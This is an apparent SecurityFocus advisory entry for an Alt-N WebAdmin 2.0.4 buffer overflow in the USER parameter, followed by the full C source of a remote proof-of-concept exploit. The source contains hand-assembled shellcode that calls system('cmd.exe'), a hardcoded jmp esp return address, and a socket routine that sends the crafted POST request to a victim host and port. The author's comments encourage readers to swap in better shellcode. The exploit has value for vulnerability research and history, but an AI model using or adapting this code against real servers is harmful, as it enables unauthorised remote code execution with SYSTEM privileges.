source: http://www.securityfocus.com/bid/8024/info

Alt-N WebAdmin is prone to a buffer overflow condition. This is due to insufficient bounds checking on the USER parameter. Successful exploitation could result in code execution with SYSTEM level privileges.

/* WebAdmin.dll remote proof of concept 2.0.4 version.. tried finding 2.0.5 but all versions
were already patched from the dl sites... this was tested on a win2ksp2 server, i suggest
using better shellcode this is just something i know works, just opens a cmd.exe prompt
on the victim box. I imagine this won't be too much harder to exploit with 2.0.5 unpatched
this took me about 1 hour to write and it was my first remote win32 exploit, thank you alt-n :D.
word to Mark Litchfield for finding this, i suggest anyone who is interested in learning win32
exploitation download this and attempt to exploit it, it's easier than you think.
shouts to innercircle you little kittens you....
-wire */
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib "ws2_32");
char sc[] = 
					 "\x55"					// push ebp
					 "\x8b\xec"				// mov ebp, esp
					 "\x53"					// push ebx
					 "\x56"					// push esi
					 "\x57"					// push edi
					 "\x8b\xe5"				// mov esp, ebp				
					 "\x55"					// push ebp
					 "\x8b\xec"				// mov ebp, esp
					 "\x33\xff"				// xor edi,edi
					 "\x57"					// push edi
					 "\x57"					// push edi
					 "\xc6\x45\xf8\x6d"			// mov byte ptr ss:[ebp-8],6d
					 "\xc6\x45\xf9\x73"			// mov byte ptr ss:[ebp-7],73
					 "\xc6\x45\xfa\x76"			// mov byte ptr ss:[ebp-6],76
					 "\xc6\x45\xfb\x63"			// mov byte ptr ss:[ebp-5],63
					 "\xc6\x45\xfc\x72"			// mov byte ptr ss:[ebp-4],72
					 "\xc6\x45\xfd\x74"			// mov byte ptr ss:[ebp-3],74
					 "\xb8\x54\xa2\xe8\x77" 		// mov eax,kernel32.loadlibraryA;
					 "\x50"					// push eax
					 "\x8d\x45\xf8"				// lea eax, dword ptr ss:[ebp-8]
					 "\x50"					// push eax
					 "\xff\x55\xf4"				// call dword ptr ss:[ebp-c]
					 "\x58"					// pop eax
					 "\x58"					// pop eax
					 "\x58"					// pop eax
					 "\x33\xc0"				// xor eax,eax
					 "\x50"					// push eax
					 "\x50"					// push eax
					 "\xc6\x45\xf8\x63"			// mov byte ptr ss:[ebp-8],63
					 "\xc6\x45\xf9\x6d"			// mov byte ptr ss:[ebp-7],6d
					 "\xc6\x45\xfa\x64"			// mov byte ptr ss:[ebp-6],64
					 "\xc6\x45\xfb\x2e"			// mov byte ptr ss:[ebp-5],2e
					 "\xc6\x45\xfc\x65"			// mov byte ptr ss:[ebp-4],65
					 "\xc6\x45\xfd\x78"			// mov byte ptr ss:[ebp-3],78
					 "\xc6\x45\xfe\x65"			// mov byte ptr ss:[ebp-2],65
					 "\xb8\x4a\x9B\x01\x78"			// mov eax, 78019b4a;system() from msvcrt win2ksp2
					 "\x50"					// push eax
					 "\x8d\x45\xf8"				// lea eax, dword ptr ss:[ebp-8]
					 "\x50"					// push eax
					 "\xff\x55\xf4"				// call dword ptr ss:[ebp-c]
					 "\x83\xc4\x04"				// add esp, 04h
					 "\x5c"					// pop esp
					 "\xc3";				// ret			we're done!



struct sockaddr_in victim;
int main(int argc, char **argv) {
	SOCKET s;
	WSADATA wsadata;
	int x;
	DWORD jmpesp = 0x1005d58d; // jmp esp from 2.0.4 webAdmin.dll...
	char exp_buf[5000];
	char boom[] = 
		"POST /WebAdmin.dll?View=Logon HTTP/1.1\r\n"
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n"
		"Accept-Language: en-us\r\n"
		"Content-Type: application/x-www-form-urlencoded\r\n"
		"Accept-Encoding: gzip, deflate\r\n"
		"User-Agent: Your Mom\r\n"
		"Host: sh0dan.org\r\n"
		"Content-Length: 395\r\n"
		"Connection: Keep-Alive\r\n"
		"Cache-Control: no-cache\r\n"
		"Cookie: User=test; Lang=en; Theme=Standard\r\n\r\nUser=";
	char o_args[] = 
		"&Password=foo&languageselect=en&Theme=Heavy&Logon=Sign+In\r\n\r\n";
	
    if (argc != 3) {
		fprintf(stderr, "WebAdmin from Alt-N 2.0.4 Remote Exploit Proof Of Concept\n");
		fprintf(stderr, "Werd to Mark Litchfield for finding this easily exploited hole\n");
		fprintf(stderr, "Usage: %s <victim> <port>\n", argv[0]);
		exit(1);
	}

	WSAStartup(MAKEWORD(2,0),&wsadata);
	victim.sin_port = htons(atoi(argv[2]));
	victim.sin_addr.s_addr = inet_addr(argv[1]);
	victim.sin_family = AF_INET;

	memset(exp_buf, 0x90, 5000);
	x = strlen(boom);
	strncpy(exp_buf, boom, x);
	x += 168;

	memcpy(exp_buf+x, &jmpesp, 4);
	x += 4;
	memcpy(exp_buf+x, sc, strlen(sc));
	x += strlen(sc);
	memcpy(exp_buf+x, o_args, strlen(o_args));
	x += strlen(o_args);
	exp_buf[x+1] = 0x00;

	s = WSASocket(AF_INET,SOCK_STREAM,NULL,NULL,NULL,NULL);
	connect(s, (struct sockaddr *)&victim, sizeof(victim));
	send(s, exp_buf, x, 0);
    
	printf("booyah");
	return(0);
}